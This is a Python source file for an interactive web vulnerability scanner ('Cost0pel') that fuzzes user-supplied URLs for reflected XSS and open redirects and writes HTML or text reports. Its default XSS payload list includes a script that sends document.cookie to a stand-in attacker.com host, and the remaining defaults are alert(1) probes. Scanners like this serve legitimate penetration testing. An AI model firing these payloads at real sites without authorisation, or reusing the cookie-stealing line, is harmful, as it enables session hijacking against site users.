#!/usr/bin/env python3
import os
import time
import sys
import argparse
import signal
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style, init
from rich.console import Console
from rich.panel import Panel
import requests
import datetime
import uuid
import warnings

# Suppress SSL warnings
warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)

# Initialize colorama
init(autoreset=True)

# Initialize rich console
console = Console()

def clear_screen():
    """Clear the terminal screen."""
    os.system('cls' if os.name == 'nt' else 'clear')


def create_banner():
    """Create a colorful banner."""
    panel = Panel(r"""
    ██████╗ ██████╗ ███████╗████████╗ ██████╗ ██████╗ ███████╗██╗
   ██╔════╝██╔═══██╗██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗██╔════╝██║
   ██║     ██║   ██║███████╗   ██║   ██║   ██║██████╔╝█████╗  ██║
   ██║     ██║   ██║╚════██║   ██║   ██║   ██║██╔═══╝ ██╔══╝  ██║
   ╚██████╗╚██████╔╝███████║   ██║   ╚██████╔╝██║     ███████╗██║
    ╚═════╝ ╚═════╝ ╚══════╝   ╚═╝    ╚═════╝ ╚═╝     ╚══════╝█████
    """,
                 style="bold blue",
                 border_style="cyan")
    
    console.print(panel)
    console.print("[bold cyan][*] Advanced Web Vulnerability Scanner by cost0pel v1.0")
    console.print("[cyan][*] Smart Vulnerability Detection & Testing\n")


def generate_html_report(scanner, vuln_type):
    """Generate HTML report based on scan results."""
    scan_id = str(uuid.uuid4())[:8]
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    elapsed_time = int(time.time() - scanner.start_time)
    vuln_rate = (scanner.total_found / scanner.total_scanned) * 100 if scanner.total_scanned > 0 else 0
    
    html_template = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cost0pel Security Scan Report</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&display=swap');
        
        body {{
            background-color: #1a1a2e;
            color: #e0e0e0;
            font-family: 'Roboto Mono', monospace;
            margin: 0;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            background-image: linear-gradient(rgba(26, 26, 46, 0.97), rgba(26, 26, 46, 0.97));
        }}
        
        .container {{
            max-width: 900px;
            width: 100%;
            border: 1px solid #ff4c4c;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 40px;
            background-color: #0f0f1f;
            box-shadow: 0 0 20px rgba(255, 76, 76, 0.2);
        }}
        
        .header {{
            color: #ff4c4c;
            text-align: center;
            margin-bottom: 30px;
            font-size: 28px;
            text-shadow: 0 0 10px rgba(255, 76, 76, 0.5);
            letter-spacing: 2px;
        }}
        
        .info-table {{
            width: 100%;
            border-collapse: collapse;
            margin-bottom: 30px;
            color: #e0e0e0;
        }}
        
        .info-table td {{
            padding: 10px;
            border-bottom: 1px solid #33334d;
        }}
        
        .info-table td:first-child {{
            color: #4caf50;
            width: 50%;
        }}
        
        .info-table td:last-child {{
            color: #ff9800;
            text-align: right;
        }}
        
        .stats-container {{
            display: flex;
            justify-content: space-between;
            flex-wrap: wrap;
            margin-bottom: 30px;
        }}
        
        .stat-box {{
            flex: 1;
            min-width: 120px;
            background-color: #1a1a2e;
            border: 1px solid #ff4c4c;
            border-radius: 5px;
            padding: 15px;
            margin: 0 10px 10px 0;
            text-align: center;
        }}
        
        .stat-number {{
            font-size: 24px;
            color: #4caf50;
            margin-bottom: 5px;
        }}
        
        .stat-label {{
            font-size: 12px;
            color: #e0e0e0;
        }}
        
        .section-title {{
            color: #ff4c4c;
            text-align: center;
            margin: 30px 0;
            font-size: 24px;
            text-shadow: 0 0 10px rgba(255, 76, 76, 0.5);
            letter-spacing: 2px;
        }}
        
        .timeline {{
            position: relative;
            margin: 30px 0;
            padding-left: 30px;
        }}
        
        .timeline::before {{
            content: '';
            position: absolute;
            top: 0;
            left: 15px;
            width: 2px;
            height: 100%;
            background-color: #ff4c4c;
        }}
        
        .timeline-item {{
            position: relative;
            margin-bottom: 30px;
            padding-left: 30px;
        }}
        
        .timeline-item::before {{
            content: '';
            position: absolute;
            top: 0;
            left: -22px;
            width: 20px;
            height: 20px;
            border-radius: 50%;
            background-color: #0f0f1f;
            border: 2px solid #4caf50;
        }}
        
        .timeline-item-title {{
            color: #64b5f6;
            margin-bottom: 10px;
        }}
        
        .timeline-item-content {{
            color: #ff9800;
        }}
        
        .vulnerable-list {{
            margin-top: 30px;
        }}
        
        .vulnerable-item {{
            background-color: #1a1a2e;
            border-left: 4px solid #ff4c4c;
            padding: 15px;
            margin-bottom: 15px;
            border-radius: 0 5px 5px 0;
        }}
        
        .vulnerable-url {{
            color: #4fc3f7;
            font-size: 16px;
            margin-bottom: 10px;
            word-break: break-all;
        }}
        
        .vulnerable-url a {{
            color: #4fc3f7;
            text-decoration: none;
        }}
        
        .vulnerable-payload {{
            color: #ff9800;
            background-color: #0f0f1f;
            padding: 5px 10px;
            border-radius: 4px;
            font-size: 14px;
            display: inline-block;
            margin-top: 5px;
        }}
        
        .footer {{
            margin-top: 40px;
            text-align: center;
            color: #607d8b;
            font-size: 12px;
        }}
        
        @keyframes pulse {{
            0% {{ transform: scale(1); }}
            50% {{ transform: scale(1.05); }}
            100% {{ transform: scale(1); }}
        }}
        
        .highlight {{
            animation: pulse 2s infinite;
        }}
    </style>
</head>
<body>
    <div class="container">
        <h1 class="header">COST0PEL SECURITY SCAN REPORT</h1>
        
        <table class="info-table">
            <tr>
                <td>Scan Type:</td>
                <td>{vuln_type}</td>
            </tr>
            <tr>
                <td>Total Vulnerabilities Found:</td>
                <td>{scanner.total_found}</td>
            </tr>
            <tr>
                <td>Total URLs Scanned:</td>
                <td>{scanner.total_scanned}</td>
            </tr>
            <tr>
                <td>Time Taken:</td>
                <td>{elapsed_time} seconds</td>
            </tr>
        </table>
        
        <div class="stats-container">
            <div class="stat-box">
                <div class="stat-number">{scanner.total_found}</div>
                <div class="stat-label">Vulnerabilities Detected</div>
            </div>
            <div class="stat-box">
                <div class="stat-number">{scanner.total_scanned}</div>
                <div class="stat-label">URLs Scanned</div>
            </div>
            <div class="stat-box">
                <div class="stat-number">{elapsed_time}s</div>
                <div class="stat-label">Scan Duration</div>
            </div>
            <div class="stat-box">
                <div class="stat-number">{vuln_rate:.2f}%</div>
                <div class="stat-label">Vulnerability Rate</div>
            </div>
        </div>
        
        <h2 class="section-title">SCAN TIMELINE</h2>
        
        <div class="timeline">
            <div class="timeline-item">
                <div class="timeline-item-title">Scan Initiated</div>
                <div class="timeline-item-content">Type: {vuln_type}</div>
            </div>
            
            <div class="timeline-item">
                <div class="timeline-item-title">Scanning Process</div>
                <div class="timeline-item-content">{scanner.total_scanned} URLs analyzed</div>
            </div>
            
            <div class="timeline-item">
                <div class="timeline-item-title">Vulnerabilities Detected</div>
                <div class="timeline-item-content">{scanner.total_found} vulnerabilities found</div>
            </div>
            
            <div class="timeline-item">
                <div class="timeline-item-title">Scan Completed</div>
                <div class="timeline-item-content">Duration: {elapsed_time} seconds</div>
            </div>
        </div>
        
        <h2 class="section-title">VULNERABLE URLS</h2>
        
        <div class="vulnerable-list">
"""
    
    # Add vulnerable URLs
    if len(scanner.vuln_temp) > 0:
        for vuln_data in scanner.vuln_temp:
            if vuln_type == "XSS":
                url, payload = vuln_data
                redirect_info = ""
            else:  # Open Redirect
                url, payload, redirect = vuln_data
                redirect_info = f'<div>Redirects to: <span class="vulnerable-payload">{redirect}</span></div>'
                
            html_template += f"""
            <div class="vulnerable-item">
                <div class="vulnerable-url"><a href="{url}" target="_blank">{url}</a></div>
                <div>Payload: <span class="vulnerable-payload">{payload}</span></div>
                {redirect_info}
            </div>
            """
    else:
        html_template += """
            <div class="vulnerable-item">
                <div class="vulnerable-url">No vulnerabilities found</div>
            </div>
        """
    
    # Footer
    html_template += """
        </div>
    </div>
    
    <div class="footer">
        <p>Generated by Cost0pel Security Scanner | &copy; 2023 cost0pel</p>
    </div>
</body>
</html>
"""
    return html_template


def save_html_report(html_content, vuln_type):
    """Save HTML report to a file."""
    filename = "report.html"
    
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(html_content)
    
    return filename


class VulnerabilityScanner:
    def __init__(self):
        self.vuln_temp = []
        self.total_scanned = 0
        self.total_found = 0
        self.start_time = time.time()
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        self.proxies = None
    
    def get_request_options(self):
        """Get user defined request options (custom headers and proxies)."""
        print(f"\n{Fore.YELLOW}[+] Request Options:")
        print(f"{Fore.CYAN}════════════════════════════════")
        
        # Custom User-Agent option
        custom_ua = input(f"{Fore.BLUE}[?]{Fore.RESET} Use custom User-Agent? (y/n, default: n): ").lower()
        if custom_ua == 'y':
            ua_value = input(f"{Fore.BLUE}[?]{Fore.RESET} Enter User-Agent value: ")
            if ua_value:
                self.headers['User-Agent'] = ua_value
                print(f"{Fore.GREEN}[+]{Fore.RESET} Custom User-Agent set: {ua_value}")
                
        # Custom header option
        custom_header = input(f"{Fore.BLUE}[?]{Fore.RESET} Add custom header? (y/n, default: n): ").lower()
        if custom_header == 'y':
            header_name = input(f"{Fore.BLUE}[?]{Fore.RESET} Enter header name: ")
            header_value = input(f"{Fore.BLUE}[?]{Fore.RESET} Enter header value: ")
            if header_name and header_value:
                self.headers[header_name] = header_value
                print(f"{Fore.GREEN}[+]{Fore.RESET} Custom header added: {header_name}: {header_value}")
        
        # Proxy option
        use_proxy = input(f"{Fore.BLUE}[?]{Fore.RESET} Use proxy for requests (e.g. Burp)? (y/n, default: n): ").lower()
        if use_proxy == 'y':
            proxy_url = input(f"{Fore.BLUE}[?]{Fore.RESET} Enter proxy URL (e.g. http://127.0.0.1:8080): ")
            if proxy_url:
                self.proxies = {
                    'http': proxy_url,
                    'https': proxy_url
                }
                print(f"{Fore.GREEN}[+]{Fore.RESET} Proxy set: {proxy_url}")
    
    def check_xss_with_http(self, url, payload):
        """Test XSS payload using HTTP requests for basic detection."""
        target_url = f"{url}{payload}"
        try:
            print(f"{Fore.YELLOW}[→] {Fore.CYAN}Testing payload: {Fore.YELLOW}{payload} {Fore.CYAN}on {Fore.YELLOW}{target_url}")
            
            response = requests.get(target_url, headers=self.headers, proxies=self.proxies, timeout=10, verify=False)
            page_source = response.text
            
            # İs XSS vulnerable?
            is_vulnerable = False
            
            # Kontroller:
            # 1. Payload sayfada aynen görünüyor mu?
            if payload in page_source:
                # 2. Payload HTML encode edilmiş mi?
                html_encoded = payload.replace('<', '&lt;').replace('>', '&gt;')
                if html_encoded not in page_source:
                    is_vulnerable = True
            
            # 3. Specifik XSS payload kontrolü
            if "<script>" in payload and "<script>" in page_source and "alert(1)" in page_source:
                is_vulnerable = True
                
            if "onerror=" in payload and "onerror=" in page_source and "alert(1)" in page_source:
                is_vulnerable = True
                
            if "onload=" in payload and "onload=" in page_source and "alert(1)" in page_source:
                is_vulnerable = True
            
            if is_vulnerable:
                self.total_found += 1
                self.vuln_temp.append((target_url, payload))
                return f"{Fore.GREEN}[✓]{Fore.CYAN} Vulnerable: {Fore.GREEN} {target_url}", True
            
            return f"{Fore.RED}[✗]{Fore.CYAN} Not Vulnerable: {Fore.RED} {target_url}", False
        
        except Exception as e:
            return f"{Fore.RED}[✗]{Fore.CYAN} Error: {Fore.RED} {str(e)} {Fore.CYAN}for {target_url}", False
        
        finally:
            self.total_scanned += 1
    
    def check_open_redirect_with_http(self, url, payload):
        """Test Open Redirect payload using HTTP requests for basic detection."""
        target_url = f"{url}{payload}"
        try:
            print(f"{Fore.YELLOW}[→] {Fore.CYAN}Testing payload: {Fore.YELLOW}{payload} {Fore.CYAN}on {Fore.YELLOW}{target_url}")
            
            # Don't follow redirects so we can check the Location header
            response = requests.get(target_url, headers=self.headers, proxies=self.proxies, timeout=10, allow_redirects=False, verify=False)
            
            # Check if there's a redirect
            if 300 <= response.status_code < 400:
                location = response.headers.get('Location', '')
                
                # Check if we're being redirected to an external domain
                if location and not location.startswith(url):
                    self.total_found += 1
                    self.vuln_temp.append((target_url, payload, location))
                    return f"{Fore.GREEN}[✓]{Fore.CYAN} Vulnerable: {Fore.GREEN} {target_url} {Fore.CYAN}-> {location}", True
            
            return f"{Fore.RED}[✗]{Fore.CYAN} Not Vulnerable: {Fore.RED} {target_url}", False
        
        except Exception as e:
            return f"{Fore.RED}[✗]{Fore.CYAN} Error: {Fore.RED} {str(e)} {Fore.CYAN}for {target_url}", False
        
        finally:
            self.total_scanned += 1
    
    def get_url_input(self):
        """Prompt user for URL input method and obtain URLs."""
        print(f"\n{Fore.YELLOW}[+] URL Input Options:")
        print(f"{Fore.CYAN}════════════════════════════════")
        print(f"    {Fore.BLUE}[1]{Fore.RESET} Single URL")
        print(f"    {Fore.BLUE}[2]{Fore.RESET} URL List File")
        print(f"{Fore.CYAN}════════════════════════════════")
        
        url_choice = input(f"{Fore.BLUE}[?]{Fore.RESET} Select input method: ")
        
        if url_choice == "1":
            target_url = input(f"{Fore.BLUE}[?]{Fore.RESET} Enter target URL: ")
            if not target_url:
                print(f"{Fore.RED}[!] URL cannot be empty")
                return self.get_url_input()
            return [target_url]
        
        elif url_choice == "2":
            url_file = input(f"{Fore.BLUE}[?]{Fore.RESET} Enter path to URL list file: ")
            if not os.path.isfile(url_file):
                print(f"{Fore.RED}[!] File not found")
                return self.get_url_input()
            
            with open(url_file, 'r') as f:
                urls = [line.strip() for line in f if line.strip()]
            
            print(f"{Fore.GREEN}[+]{Fore.RESET} Loaded {Fore.WHITE}{len(urls)}{Fore.RESET} URLs from file")
            return urls
        
        else:
            print(f"{Fore.RED}[!] Invalid choice")
            return self.get_url_input()
    
    def get_payload_options(self, vuln_type):
        """Prompt user for payload source and obtain payloads."""
        print(f"\n{Fore.YELLOW}[+] Payload Options:")
        print(f"{Fore.CYAN}════════════════════════════════")
        print(f"    {Fore.BLUE}[1]{Fore.RESET} Use default payloads")
        print(f"    {Fore.BLUE}[2]{Fore.RESET} Use custom payload file")
        print(f"{Fore.CYAN}════════════════════════════════")
        
        payload_choice = input(f"{Fore.BLUE}[?]{Fore.RESET} Select payload source: ")
        
        if payload_choice == "1":
            return self.generate_default_payloads(vuln_type)
        
        elif payload_choice == "2":
            payload_file = input(f"{Fore.BLUE}[?]{Fore.RESET} Enter path to payload file: ")
            if not os.path.isfile(payload_file):
                print(f"{Fore.RED}[!] Payload file not found")
                return self.get_payload_options(vuln_type)
            
            with open(payload_file, 'r') as f:
                payloads = [line.strip() for line in f if line.strip()]
            
            return payloads
        
        else:
            print(f"{Fore.RED}[!] Invalid choice")
            return self.get_payload_options(vuln_type)
    
    def generate_default_payloads(self, vuln_type):
        """Generate default payloads based on vulnerability type."""
        if vuln_type == "XSS":
            return [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "\"><script>alert(1)</script>",
                "\"><img src=x onerror=alert(1)>",
                "';alert(1);//",
                "<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>"
            ]
        elif vuln_type == "Open Redirect":
            return [
                "//bing.com",
                "http://bing.com",
                "https://bing.com",
                "https://google.com",
                "javascript:alert(1)",
                "//www.google.com/%2F.."
            ]
        return []
    
    def run_scan(self, urls, payloads, vuln_type, max_threads=5):
        """Run the vulnerability scan using ThreadPoolExecutor for concurrency."""
        print(f"\n{Fore.CYAN}[*] Starting {vuln_type} scan...")
        print(f"{Fore.CYAN}════════════════════════════════")
        
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = []
            
            for url in urls:
                for payload in payloads:
                    if vuln_type == "XSS":
                        futures.append(executor.submit(self.check_xss_with_http, url, payload))
                    elif vuln_type == "Open Redirect":
                        futures.append(executor.submit(self.check_open_redirect_with_http, url, payload))
            
            try:
                for future in as_completed(futures):
                    try:
                        result, _ = future.result()
                        print(result)
                    except Exception as e:
                        print(f"{Fore.RED}[!] Exception: {str(e)}")
            except KeyboardInterrupt:
                print(f"\n{Fore.RED}[!] Scan interrupted by user")
                executor.shutdown(wait=False)
                return
    
    def print_summary(self):
        """Print scan summary with results."""
        elapsed_time = int(time.time() - self.start_time)
        
        print(f"\n{Fore.CYAN}[*] Scan Results:")
        print(f"{Fore.CYAN}════════════════════════════════")
        
        if self.vuln_temp:
            print(f"{Fore.GREEN}[+] Vulnerable URLs found: {len(self.vuln_temp)}")
            for vuln_data in self.vuln_temp:
                if isinstance(vuln_data, tuple) and len(vuln_data) >= 2:
                    if len(vuln_data) == 2:  # XSS format
                        url, payload = vuln_data
                        print(f"    {Fore.YELLOW}→{Fore.RESET} {url}")
                        print(f"      {Fore.YELLOW}▷{Fore.RESET} Payload: {payload}")
                    else:  # Open Redirect format
                        url, payload, redirect = vuln_data
                        print(f"    {Fore.YELLOW}→{Fore.RESET} {url}")
                        print(f"      {Fore.YELLOW}▷{Fore.RESET} Payload: {payload}")
                        print(f"      {Fore.YELLOW}▷{Fore.RESET} Redirects to: {redirect}")
                else:
                    print(f"    {Fore.YELLOW}→{Fore.RESET} {vuln_data}")
        else:
            print(f"{Fore.RED}[!] No vulnerabilities found")
        
        print(f"\n{Fore.CYAN}[*] Summary:")
        print(f"{Fore.CYAN}════════════════════════════════")
        print(f"{Fore.WHITE}• Total vulnerabilities: {self.total_found}")
        print(f"{Fore.WHITE}• Total scanned: {self.total_scanned}")
        print(f"{Fore.WHITE}• Time taken: {elapsed_time} seconds")


def main_menu():
    """Display the main menu and handle user input."""
    print(f"{Fore.YELLOW}[+] Select Vulnerability Type to Test:")
    print(f"{Fore.CYAN}════════════════════════════════")
    print(f"    {Fore.BLUE}[1]{Fore.RESET} Cross-Site Scripting (XSS)")
    print(f"    {Fore.BLUE}[2]{Fore.RESET} Open Redirect")
    print(f"    {Fore.RED}[0]{Fore.RESET} Exit")
    print(f"{Fore.CYAN}════════════════════════════════")
    
    main_choice = input(f"{Fore.BLUE}[?]{Fore.RESET} Select an option: ")
    
    if main_choice == "1":
        return "XSS"
    elif main_choice == "2":
        return "Open Redirect"
    elif main_choice == "0":
        print(f"\n{Fore.CYAN}[*] Goodbye! Happy hunting, cost0pel! 🕵️‍♂️\n")
        sys.exit(0)
    else:
        print(f"{Fore.RED}[!] Invalid choice")
        return None


def main():
    """Main function to run the vulnerability scanner."""
    try:
        # Set up signal handler for CTRL+C
        signal.signal(signal.SIGINT, signal_handler)
        
        clear_screen()
        create_banner()
        
        while True:
            vuln_type = main_menu()
            
            if not vuln_type:
                continue
            
            scanner = VulnerabilityScanner()
            print(f"\n{Fore.GREEN}[+] Selected: {vuln_type}")
            
            # Get request options
            scanner.get_request_options()
            
            # Get URLs and payloads
            urls = scanner.get_url_input()
            payloads = scanner.get_payload_options(vuln_type)
            
            # Get thread count
            try:
                threads = int(input(f"{Fore.BLUE}[?]{Fore.RESET} Enter number of concurrent threads (1-10, default: 5): ") or "5")
                threads = max(1, min(10, threads))
            except ValueError:
                threads = 5
            
            # Run the scan
            scanner.run_scan(urls, payloads, vuln_type, threads)
            scanner.print_summary()
            
            # Save report
            save_choice = input(f"\n{Fore.BLUE}[?]{Fore.RESET} Do you want to save the results? (y/n): ")
            if save_choice.lower() == 'y':
                html_format = input(f"{Fore.BLUE}[?]{Fore.RESET} Generate HTML report? (y/n): ")
                if html_format.lower() == 'y':
                    html_content = generate_html_report(scanner, vuln_type)
                    filename = save_html_report(html_content, vuln_type)
                    print(f"{Fore.GREEN}[+] HTML report saved to {filename}")
                    
                    open_report = input(f"{Fore.BLUE}[?]{Fore.RESET} Open the report now? (y/n): ")
                    if open_report.lower() == 'y':
                        import webbrowser
                        webbrowser.open(filename)
                else:
                    # Save as plain text
                    filename = input(f"{Fore.BLUE}[?]{Fore.RESET} Enter filename to save results: ")
                    if not filename:
                        filename = f"vuln_scan_results_{int(time.time())}.txt"
                    
                    with open(filename, 'w') as f:
                        f.write("=== Vulnerability Scan Results ===\n\n")
                        f.write(f"Total vulnerabilities: {scanner.total_found}\n")
                        f.write(f"Total scanned: {scanner.total_scanned}\n")
                        f.write(f"Time taken: {int(time.time() - scanner.start_time)} seconds\n\n")
                        
                        f.write("=== Vulnerable URLs ===\n\n")
                        for vuln_data in scanner.vuln_temp:
                            if vuln_type == "XSS":
                                url, payload = vuln_data
                                f.write(f"URL: {url}\n")
                                f.write(f"Payload: {payload}\n\n")
                            else:  # Open Redirect
                                url, payload, redirect = vuln_data
                                f.write(f"URL: {url}\n")
                                f.write(f"Payload: {payload}\n")
                                f.write(f"Redirects to: {redirect}\n\n")
                    
                    print(f"{Fore.GREEN}[+] Results saved to {filename}")
            
            # Ask to continue
            continue_choice = input(f"\n{Fore.BLUE}[?]{Fore.RESET} Do you want to test another vulnerability? (y/n): ")
            if continue_choice.lower() != 'y':
                print(f"\n{Fore.CYAN}[*] Goodbye! Happy hunting, cost0pel! 🕵️‍♂️\n")
                break
    
    except KeyboardInterrupt:
        sys.exit(0)


def signal_handler(sig, frame):
    """Handle Ctrl+C signal."""
    print(f"\n\n{Fore.RED}[!] Scan interrupted by user. Exiting...\n")
    sys.exit(0)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Program interrupted by user. Exiting...")
        sys.exit(0) 